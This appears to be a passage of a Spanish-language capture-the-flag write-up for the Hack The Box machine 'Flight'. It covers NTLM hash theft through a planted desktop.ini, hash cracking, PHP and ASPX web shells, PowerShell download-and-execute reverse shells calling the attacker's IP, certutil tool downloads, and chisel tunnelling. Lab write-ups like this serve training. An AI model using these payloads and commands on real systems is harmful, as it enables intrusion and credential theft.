	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY	
</code></pre></div></div>

<ul>
  <li>De momento no hay nada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.187/shared <span class="nt">-U</span> S.Moon
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\S</span>.Moon]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Sat May  6 19:02:41 2023
  ..                                  D        0  Sat May  6 19:02:41 2023

		5056511 blocks of size 4096. 1167339 blocks available
smb: <span class="se">\&gt;</span> 
</code></pre></div></div>

<p>Como no sabemos que archivos podemos subir por ejemplo <strong>.php</strong> o <strong>.ini</strong> o algun otro podemos usar esta herramienta que nos crea varios archivos para ya no tener que crearlos desde 0 y subirlos directamente asta ser aceptados.</p>

<p><a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a></p>

<p><a href="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini">https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 ntlm_theft.py <span class="nt">-g</span> all <span class="nt">-s</span> 10.10.14.86 <span class="nt">-f</span> Gracias
Created: Gracias/Gracias.scf <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
Created: Gracias/Gracias-<span class="o">(</span>url<span class="o">)</span>.url <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
Created: Gracias/Gracias-<span class="o">(</span>icon<span class="o">)</span>.url <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
Created: Gracias/Gracias.lnk <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
Created: Gracias/Gracias.rtf <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias-<span class="o">(</span>stylesheet<span class="o">)</span>.xml <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias-<span class="o">(</span>fulldocx<span class="o">)</span>.xml <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias.htm <span class="o">(</span>OPEN FROM DESKTOP WITH CHROME, IE OR EDGE<span class="o">)</span>
Created: Gracias/Gracias-<span class="o">(</span>includepicture<span class="o">)</span>.docx <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias-<span class="o">(</span>remotetemplate<span class="o">)</span>.docx <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias-<span class="o">(</span>frameset<span class="o">)</span>.docx <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias-<span class="o">(</span>externalcell<span class="o">)</span>.xlsx <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias.wax <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias.m3u <span class="o">(</span>OPEN IN WINDOWS MEDIA PLAYER ONLY<span class="o">)</span>
Created: Gracias/Gracias.asx <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias.jnlp <span class="o">(</span>OPEN<span class="o">)</span>
Created: Gracias/Gracias.application <span class="o">(</span>DOWNLOAD AND OPEN<span class="o">)</span>
Created: Gracias/Gracias.pdf <span class="o">(</span>OPEN AND ALLOW<span class="o">)</span>
Created: Gracias/zoom-attack-instructions.txt <span class="o">(</span>PASTE TO CHAT<span class="o">)</span>
Created: Gracias/Autorun.inf <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
Created: Gracias/desktop.ini <span class="o">(</span>BROWSE TO FOLDER<span class="o">)</span>
Generation Complete.

</code></pre></div></div>

<ul>
  <li>
    <p>Con esto hemos creado un directorio llamado Gracias donde se encuentran todos estos archivos.</p>
  </li>
  <li>
    <p>Vamos a subir el <code class="language-plaintext highlighter-rouge">.ini</code> primero ya que es un archivo que usa <code class="language-plaintext highlighter-rouge">Windows</code> y si hay alguien por detras revisando los archivos nos llegara su <strong>hash ntlmv2</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn desktop.ini
<span class="o">[</span>.ShellClassInfo]
<span class="nv">IconResource</span><span class="o">=</span><span class="se">\\</span>10.10.14.86<span class="se">\a</span>a
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.187/shared <span class="nt">-U</span> S.Moon
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\S</span>.Moon]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> put desktop.ini
putting file desktop.ini as <span class="se">\d</span>esktop.ini <span class="o">(</span>0.1 kb/s<span class="o">)</span> <span class="o">(</span>average 0.1 kb/s<span class="o">)</span>
smb: <span class="se">\&gt;</span> 
</code></pre></div></div>

<ul>
  <li>Vamos usar <code class="language-plaintext highlighter-rouge">responder</code> para ver si nos llega otro hash y si nos llega el <code class="language-plaintext highlighter-rouge">hash</code> de otro usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ responder <span class="nt">-I</span> tun0 <span class="nt">-v</span>
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    DNS/MDNS                   <span class="o">[</span>ON]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>OFF]
    Fingerprint hosts          <span class="o">[</span>OFF]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.86]
    Challenge <span class="nb">set</span>              <span class="o">[</span>random]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-EXDXPM1RBFS]
    Responder Domain Name      [4N6C.LOCAL]
    Responder DCE-RPC Port     [49860]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:560adafc5dad6194:F0D84B7798B9710577010D771417F2A6:010100000000000080950F231680D90190AC29609653BA97000000000200080034004E003600430001001E00570049004E002D00450058004400580050004D003100520042004600530004003400570049004E002D00450058004400580050004D00310052004200460053002E0034004E00360043002E004C004F00430041004C000300140034004E00360043002E004C004F00430041004C000500140034004E00360043002E004C004F00430041004C000700080080950F231680D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000

</span></code></pre></div></div>

<ul>
  <li>Vamos a crackear el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn hash2
c.bum::flight.htb:560adafc5dad6194:F0D84B7798B9710577010D771417F2A6:010100000000000080950F231680D90190AC29609653BA97000000000200080034004E003600430001001E00570049004E002D00450058004400580050004D003100520042004600530004003400570049004E002D00450058004400580050004D00310052004200460053002E0034004E00360043002E004C004F00430041004C000300140034004E00360043002E004C004F00430041004C000500140034004E00360043002E004C004F00430041004C000700080080950F231680D90106000400020000000800300030000000000000000000000000300000DDF1C68546D7FBF8E1D2F800182F46C1660157CA4B8589AE48156B3010C812A10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380036000000000000000000
❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Tikkycoll_431012284 <span class="o">(</span>c.bum<span class="o">)</span>
1g 0:00:00:15 DONE <span class="o">(</span>2023-05-06 12:29<span class="o">)</span> 0.06640g/s 699665p/s 699665c/s 699665C/s Timber06..Tiffani29
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<h2 id="user-cbum">User c.bum</h2>

<ul>
  <li>Tenemos contraseñas vamos a validar si son correctas con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">c.bum:Tikkycoll_431012284</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.11.187 <span class="nt">-u</span> <span class="s1">'c.bum'</span> <span class="nt">-p</span> <span class="s1">'Tikkycoll_431012284'</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:G0<span class="o">)</span> <span class="o">(</span>domain:flight.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.187    445    G0               <span class="o">[</span>+] flight.htb<span class="se">\c</span>.bum:Tikkycoll_431012284 
</code></pre></div></div>

<ul>
  <li>Vamos a ver los recursos compartidos a nivel de red y tenemos permisos de escritura otra vez en <strong>Shared</strong> y ahora tambien en <strong>Web</strong> quiero pensar que <strong>Web</strong> hay estaran los archivos de la pagina web pero para eso tenemos que comprobarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-u</span> <span class="s1">'c.bum'</span> <span class="nt">-p</span> <span class="s1">'Tikkycoll_431012284'</span> <span class="nt">-H</span> 10.10.11.187
<span class="o">[</span>+] IP: 10.10.11.187:445	Name: flight.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ, WRITE	
</code></pre></div></div>

<ul>
  <li>Vamos a conectarnos para ver que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.187/Web <span class="nt">-U</span> c.bum
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\c</span>.bum]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Sat May  6 19:33:58 2023
  ..                                  D        0  Sat May  6 19:33:58 2023
  flight.htb                          D        0  Sat May  6 19:32:01 2023
  school.flight.htb                   D        0  Sat May  6 19:32:01 2023

		5056511 blocks of size 4096. 1166619 blocks available
smb: <span class="se">\&gt;</span> 
</code></pre></div></div>

<ul>
  <li>Vamos a meternos en <code class="language-plaintext highlighter-rouge">flight.htb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Sat May  6 19:37:01 2023
  ..                                  D        0  Sat May  6 19:37:01 2023
  css                                 D        0  Sat May  6 19:37:01 2023
  images                              D        0  Sat May  6 19:37:01 2023
  index.html                          A     7069  Wed Feb 23 23:58:10 2022
  js                                  D        0  Sat May  6 19:37:01 2023
  
		5056511 blocks of size 4096. 1166475 blocks available
smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> 
</code></pre></div></div>

<ul>
  <li>Como la maquina web interpreta <code class="language-plaintext highlighter-rouge">php</code> podemos subir un archivo <code class="language-plaintext highlighter-rouge">.php</code> para ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn reverse.php
&lt;?php
  system<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>
?&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> put reverse.php
putting file reverse.php as <span class="se">\f</span>light.htb<span class="se">\r</span>everse.php <span class="o">(</span>0.1 kb/s<span class="o">)</span> <span class="o">(</span>average 0.1 kb/s<span class="o">)</span>
smb: <span class="se">\f</span>light.htb<span class="se">\&gt;</span> 
</code></pre></div></div>

<ul>
  <li>Ahora vemos que si funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="s1">'http://flight.htb/reverse.php?cmd=whoami'</span>
flight<span class="se">\s</span>vc_apache
</code></pre></div></div>

<ul>
  <li>Podemos usar este script <a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</a> para ganar acceso ala maquina directamente.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
<span class="nt">--2023-05-06</span> 12:45:14--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolviendo raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Conectando con raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)[</span>185.199.109.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 4339 <span class="o">(</span>4.2K<span class="o">)</span> <span class="o">[</span>text/plain]
Grabando a: «Invoke-PowerShellTcp.ps1»

Invoke-PowerShellTcp.ps1        100%[<span class="o">=======================================================&gt;]</span>   4.24K  <span class="nt">--</span>.-KB/s    en 0.002s  

2023-05-06 12:45:15 <span class="o">(</span>2.71 MB/s<span class="o">)</span> - «Invoke-PowerShellTcp.ps1» guardado <span class="o">[</span>4339/4339]

</code></pre></div></div>

<ul>
  <li>Solo tenemos que meter una linea al final del script para que nos envie la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s1">'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.86 -Port 443'</span> <span class="o">&gt;&gt;</span> sh.ps1

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn sh.ps1 | <span class="nb">tail</span> <span class="nt">-n</span> 1
Invoke-PowerShellTcp <span class="nt">-Reverse</span> <span class="nt">-IPAddress</span> 10.10.14.86 <span class="nt">-Port</span> 443
</code></pre></div></div>

<ul>
  <li>Ahora nos montamos un servidor <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python3</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...

</code></pre></div></div>

<ul>
  <li>Ponte es escucha en el puerto que indicaste por que ahora haremos la peticion para ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="nt">-G</span> <span class="s1">'http://flight.htb/reverse.php'</span> <span class="nt">--data-urlencode</span> <span class="s2">"cmd=cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.86/sh.ps1')"</span>

</code></pre></div></div>

<ul>
  <li>Se hace la peticion.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.187 - - <span class="o">[</span>06/May/2023 12:51:32] <span class="s2">"GET /sh.ps1 HTTP/1.1"</span> 200 -

</code></pre></div></div>

<h2 id="shell-svc_apache">Shell svc_apache</h2>

<ul>
  <li>Y ganamos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.86] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 55592
Windows PowerShell running as user svc_apache on G0
Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

<span class="nb">whoami
</span>flight<span class="se">\s</span>vc_apache
PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\f</span>light.htb&gt; 
</code></pre></div></div>

<ul>
  <li>Como tenemos la contraseña de otros 2 usuario podemos migrar a <code class="language-plaintext highlighter-rouge">C.bum</code> podemos usar <code class="language-plaintext highlighter-rouge">RuncasCs</code> <a href="https://github.com/antonioCoco/RunasCs/releases">https://github.com/antonioCoco/RunasCs/releases</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip RunasCs.zip
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe  
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a un directorio donde tengamos capacidad de escritura para descargar los archivos para eso crea un directorio <code class="language-plaintext highlighter-rouge">temp</code> en la maquina victima.</p>
  </li>
  <li>
    <p>Para descarganos el <strong>RuncasCs.zip</strong> podemos usar <code class="language-plaintext highlighter-rouge">certutil.exe</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/RunasCs.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  0000  ...
  c000
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
<span class="nb">dir


    </span>Directory: C:<span class="se">\t</span>emp


Mode                LastWriteTime         Length Name                                                                  
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
<span class="nt">-a----</span>         5/6/2023   7:00 PM          49152 RunasCs.exe                                                           


PS C:<span class="se">\t</span>emp&gt; 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   ./RunasCs.exe c.bum Tikkycoll_431012284 <span class="s2">"cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.86/sh.ps1')"</span>
</code></pre></div></div>

<h2 id="shell-cbum">Shell c.bum</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.86] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 55630
Windows PowerShell running as user C.Bum on G0
Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

<span class="nb">whoami
</span>flight<span class="se">\c</span>.bum
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; 
</code></pre></div></div>

<h2 id="remote-port-forwarding">Remote Port Forwarding</h2>

<ul>
  <li>Despues de usar <code class="language-plaintext highlighter-rouge">winpeas.exe</code> para enumerar la maquina, la maquina tiene el puerto <code class="language-plaintext highlighter-rouge">8000</code> por <code class="language-plaintext highlighter-rouge">TCP</code> abierto y no lo vimos con <code class="language-plaintext highlighter-rouge">nmap</code> asi que vamos a tener que usar <code class="language-plaintext highlighter-rouge">chisel</code> para aplicar <code class="language-plaintext highlighter-rouge">Remote Port Forwarding</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl.exe <span class="nt">-s</span> 127.0.0.1:8000 <span class="nt">-I</span>
HTTP/1.1 200 OK
Content-Length: 45949
Content-Type: text/html
Last-Modified: Mon, 16 Apr 2018 21:23:36 GMT
Accept-Ranges: bytes
ETag: <span class="s2">"03cf42dc9d5d31:0"</span>
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sun, 07 May 2023 02:29:55 GMT
</code></pre></div></div>

<p><a href="https://github.com/jpillora/chisel/releases/tag/v1.8.1">https://github.com/jpillora/chisel/releases/tag/v1.8.1</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/chisel.exe   
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir


    </span>Directory: C:<span class="se">\t</span>emp


Mode                LastWriteTime         Length Name                                                                  
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
<span class="nt">-a----</span>         5/6/2023   7:28 PM        1700664 chisel.exe                                                            
<span class="nt">-a----</span>         5/6/2023   7:00 PM          49152 RunasCs.exe                                                           
<span class="nt">-a----</span>         5/6/2023   7:14 PM        2027008 winPEASx64.exe                                                        


PS C:<span class="se">\t</span>emp&gt; 
</code></pre></div></div>

<ul>
  <li>Vamos a ponernos como servidor desde nuestra maquina de atacante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
2023/05/06 13:32:19 server: Reverse tunnelling enabled
2023/05/06 13:32:19 server: Fingerprint hFDZilMNfo60BDUFkwa/MYA0F50fY71fHiwdWiCkz7I<span class="o">=</span>
2023/05/06 13:32:19 server: Listening on http://0.0.0.0:1234
</code></pre></div></div>

<ul>
  <li>Nos traemos el puerto <strong>8000</strong> a nuestra maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./chisel.exe client 10.10.14.86:1234 R:8000:127.0.0.1:8000
</code></pre></div></div>

<ul>
  <li>Ahora podemos verlo desde la web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
2023/05/06 13:38:27 server: Reverse tunnelling enabled
2023/05/06 13:38:27 server: Fingerprint B7exfu6lDGQ91lZrHuZEZoLcY1LrlI//upGOKp1smYk<span class="o">=</span>
2023/05/06 13:38:27 server: Listening on http://0.0.0.0:1234
2023/05/06 13:43:43 server: session#1: tun: proxy#R:8000<span class="o">=&gt;</span>8000: Listening

</code></pre></div></div>

<ul>
  <li>Esto es lo que hay.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/flight/web5.png" />
</p>

<ul>
  <li>Bueno despues de enumerar tenemos capacidad de escritura en este directorio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls <span class="nb">.</span>
<span class="nb">.</span> flight<span class="se">\C</span>.Bum:<span class="o">(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>W<span class="o">)</span>
  NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
  NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
  CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>

Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
PS C:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment&gt; 
</code></pre></div></div>

<ul>
  <li>Vamos a usar una <code class="language-plaintext highlighter-rouge">cmd.aspx</code> para ganar acceso podemos usar el de <code class="language-plaintext highlighter-rouge">Seclists</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx <span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Vamos a subirlo ala maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> <span class="nt">-split</span> http://10.10.14.86/cmd.aspx
</code></pre></div></div>

<ul>
  <li>Funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/flight/web6.png" />
</p>

<ul>
  <li>Nos podemos en escucha con <code class="language-plaintext highlighter-rouge">rlwrap</code> para ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ejecutamos este comando para ganar acceso en el <strong>cmd.aspx</strong> vamos a reutilizar el script <code class="language-plaintext highlighter-rouge">sh.ps1</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd /c powershell IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://10.10.14.86/sh.ps1'</span><span class="o">)</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/flight/web7.png" />
</p>

<p>Ganamos acceso</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.86] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.187] 55818
Windows PowerShell running as user G0<span class="nv">$ </span>on G0
Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

<span class="nb">whoami
</span>iis apppool<span class="se">\d</span>efaultapppool
PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; 

